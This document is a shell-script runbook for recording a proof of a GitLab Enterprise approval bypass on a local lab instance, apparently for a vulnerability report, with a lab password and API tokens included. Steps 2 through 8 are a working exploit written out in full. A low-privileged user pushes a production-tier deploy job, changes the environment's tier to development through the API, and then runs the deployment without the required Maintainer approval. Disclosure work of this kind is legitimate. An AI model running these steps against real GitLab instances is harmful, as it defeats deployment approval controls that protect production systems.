# Human verification run — tier-flip approval bypass
# Do this in Git Bash, screen-recording the whole time.
# Browser (http://localhost:8081, login root / HuntLab-2026!x) open on the
# project Environments page makes the video stronger.

# ---------------------------------------------------------------
# SETUP (run once, starts recording context)
# ---------------------------------------------------------------
export B="http://localhost:8081/api/v4"
export ROOT="f90f8b39b1a710346c1d30a7f4fb68dd426c2e81"
export ATK="3fc88868c629ab91e6b15c9b58be4e56e398a290"

# ---------------------------------------------------------------
# STEP 1 — show the protection config (say on video: "deployers are
# Developers+Maintainers, approvals require a Maintainer")
# ---------------------------------------------------------------
curl -s -H "PRIVATE-TOKEN: $ROOT" "$B/groups/acme/protected_environments"
# EXPECT: {"name":"production","deploy_access_levels":[{"access_level":30, ...}],
#          "approval_rules":[{"access_level":40, ...,"required_approvals":1}]}

# ---------------------------------------------------------------
# STEP 2 — attacker pushes a deploy job for env 'payments' (tier production)
# ---------------------------------------------------------------
curl -s -X POST -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/repository/branches?branch=workloads%2Fverify&ref=main" -o /dev/null

cat > /tmp/verify_ci.json <<'EOF'
{"branch":"workloads/verify","commit_message":"verify","actions":[{"action":"update","file_path":".gitlab-ci.yml","content":"deploy-payments:\n  stage: deploy\n  script: echo deploying payments\n  environment:\n    name: payments\n    deployment_tier: production\n  when: manual\n"}]}
EOF

curl -s -X POST -H "PRIVATE-TOKEN: $ATK" -H "Content-Type: application/json" \
  -d @/tmp/verify_ci.json "$B/projects/acme%2Fapp/repository/commits"
# EXPECT: JSON with "short_id"

# ---------------------------------------------------------------
# STEP 3 — attacker starts the pipeline, grabs job + env ids
# ---------------------------------------------------------------
PIPE=$(curl -s -X POST -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/pipeline?ref=workloads%2Fverify" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
echo "pipeline=$PIPE"
sleep 15   # let GitLab create the environment + blocked deployment

curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/pipelines/$PIPE/jobs" | \
  python -c "import json,sys; [print('job', j['id'], j['name'], j['status']) for j in json.load(sys.stdin)]"
ENV_ID=$(curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/environments?search=payments" | \
  python -c "import json,sys; print([e['id'] for e in json.load(sys.stdin) if e['name']=='payments'][0])")
echo "ENV_ID=$ENV_ID"   # remember this number
# EXPECT: job deploy-payments status "manual"

# ---------------------------------------------------------------
# STEP 4 — confirm the deployment is BLOCKED awaiting approval
# (also visible in the browser: environment 'payments' shows approval required)
# ---------------------------------------------------------------
curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/deployments?environment=payments" | \
  python -c "import json,sys; [print('dep', d['id'], d['environment']['name'], d['status']) for d in json.load(sys.stdin)]"
# EXPECT: status "blocked"

# ---------------------------------------------------------------
# STEP 5 — CONTROL: attacker tries to play the job (expect 403)
# ---------------------------------------------------------------
JOB=<paste job id from step 3>
curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "PRIVATE-TOKEN: $ATK" \
  "$B/projects/acme%2Fapp/jobs/$JOB/play"
# EXPECT: {"message":"403 Forbidden"}  +  HTTP:403

# ---------------------------------------------------------------
# STEP 6 — ATTACK: attacker flips the tier (expect 200)
# ---------------------------------------------------------------
curl -s -w "\nHTTP:%{http_code}\n" -X PUT -H "PRIVATE-TOKEN: $ATK" \
  "$B/projects/acme%2Fapp/environments/$ENV_ID?tier=development" | head -c 120
# EXPECT: {"id":...,"name":"payments",...  +  HTTP:200

# ---------------------------------------------------------------
# STEP 7 — play again: job runs with ZERO approvals (expect 200)
# ---------------------------------------------------------------
curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "PRIVATE-TOKEN: $ATK" \
  "$B/projects/acme%2Fapp/jobs/$JOB/play" | head -c 120
sleep 25
curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/jobs/$JOB" | grep -o '"status":"[a-z]*"' | head -1
# EXPECT: HTTP:200 on the play, then job status "success"

# ---------------------------------------------------------------
# STEP 8 — final proof: deployment success, approvals table empty
# ---------------------------------------------------------------
curl -s -H "PRIVATE-TOKEN: $ATK" "$B/projects/acme%2Fapp/deployments?environment=payments" | \
  python -c "import json,sys; [print('dep', d['id'], d['status'], 'user:', d['user']['username']) for d in json.load(sys.stdin)]"
# EXPECT: status "success", user "attacker"

# ---------------------------------------------------------------
# STEP 9 — capture required metadata for the report
# ---------------------------------------------------------------
curl -s -H "PRIVATE-TOKEN: $ROOT" "$B/version"
# EXPECT: {"version":"19.5.1-ee",...,"enterprise":true}
docker exec gitlab gitlab-rake gitlab:check SANITIZE=true 2>&1 | tail -5
# EXPECT: "Checking GitLab subtasks ... Finished" with no red errors
